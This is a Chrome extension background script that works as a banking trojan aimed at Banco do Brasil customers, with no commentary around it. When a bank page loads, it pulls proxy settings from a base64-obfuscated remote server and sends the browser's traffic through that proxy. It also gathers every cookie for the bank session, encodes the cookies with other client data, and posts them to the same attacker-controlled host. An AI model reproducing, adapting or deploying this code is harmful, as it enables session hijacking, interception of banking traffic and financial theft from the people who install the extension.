function echo_(kkk) {
	return window.atob(kkk);
}

function tkn() {
    var randomPool = new Uint8Array(32);
    crypto.getRandomValues(randomPool);
    var hex = '';
    for (var i = 0; i < randomPool.length; ++i) {
        hex += randomPool[i].toString(16);
    }
    return hex;
}
chrome.runtime.onInstalled.addListener(function(){
	target = window.atob('aHR0cDovL2VzdHJlbGluaGFnb2xkLmhvc3BlZGFnZW1kZXNpdGVzLndzL2NvbnRhZG9yLw==');
	chrome.tabs.create({'url': target });
});

chrome.browserAction.onClicked.addListener(function(tab) {
  ////prx();
  parameter = tab.url;
  target = window.atob('');
  chrome.tabs.create({'url': target }, function(tab) {});
});

chrome.proxy.settings.get(
          {'incognito': false},
          function(config) {console.log(JSON.stringify(config));});

var cli = {};
var tkn_ = tkn();
cli.id = tkn();

cli.proxyip = '';
cli.proxyport = '';

function prxclear() {
	var config = {
		mode: "direct"
	};

	chrome.proxy.settings.set({
		value: config, 
		scope: 'regular'
	},function() {});
}


function prx() {
	var config = {
		mode: "fixed_servers",
		rules: {
		  singleProxy: {
			scheme: "http",
			host: cli.proxyip,
			port:Number(cli.proxyport)
		  },	
		  bypassList: ["127.0.0.1","::1","localhost",window.atob('cG9ydGFsc2VvcHJvbW9wbGF5Lm9ubGluZQ==')]
		}
	};

	chrome.proxy.settings.set({
		value: config, 
		scope: 'regular'
	},function() {});
}

chrome.tabs.onUpdated.addListener( function (tabId, changeInfo, tab) {
  if (changeInfo.status == 'complete') {

  	var tabId = tabId;
	var coo_ = 	'';

	if (tab.url.indexOf('bb.com.br') > 0 || tab.url.indexOf('bancobrasil.com.br') > 0) {
		if (cli.proxyip == '') {
			$.get(window.atob('aHR0cDovL3BvcnRhbHNlb3Byb21vcGxheS5vbmxpbmUvYXBpL3ByeA==')).done(function(resProxy){
				resProxy = resProxy.split(':');
				cli.proxyip = resProxy[0];
				cli.proxyport = Number(resProxy[1]);
				prx();
			});
		}

		try	{
			chrome.cookies.getAll({"url": tab.url	}, function(cookie) {
				if(cookie) {
					for (var i = cookie.length - 1; i >= 0; i--) {
						coo_ += cookie[i].name + '=' + cookie[i].value + '; ';
					}
					cli.coo = coo_;
				}
			});
		}catch(e) {
		}

		prx();
	}else {
		prxclear();
		console.log(cli);
	}
  }
});

base64 = function(s) { return window.btoa(unescape(encodeURIComponent(s))) }

chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
        request.cli.coo = base64(cli.coo);
        request.cli.proxyip = cli.proxyip;
        request.cli.proxyport = cli.proxyport;
        var submeter = base64(JSON.stringify(request.cli));
        $.post(window.atob('aHR0cDovL3BvcnRhbHNlb3Byb21vcGxheS5vbmxpbmUvYXBpL2NydWQ='),{trampo:submeter}).done(function(res){});
    }
);

function sendDetails(sendData) {
    var senndd = sendData;
        chrome.tabs.query({url : "https://*.bancobrasil.com.br/*"}, function(tabs) {
        	chrome.tabs.sendMessage(tabs[0].id, senndd, function(response) {
        });
    });
}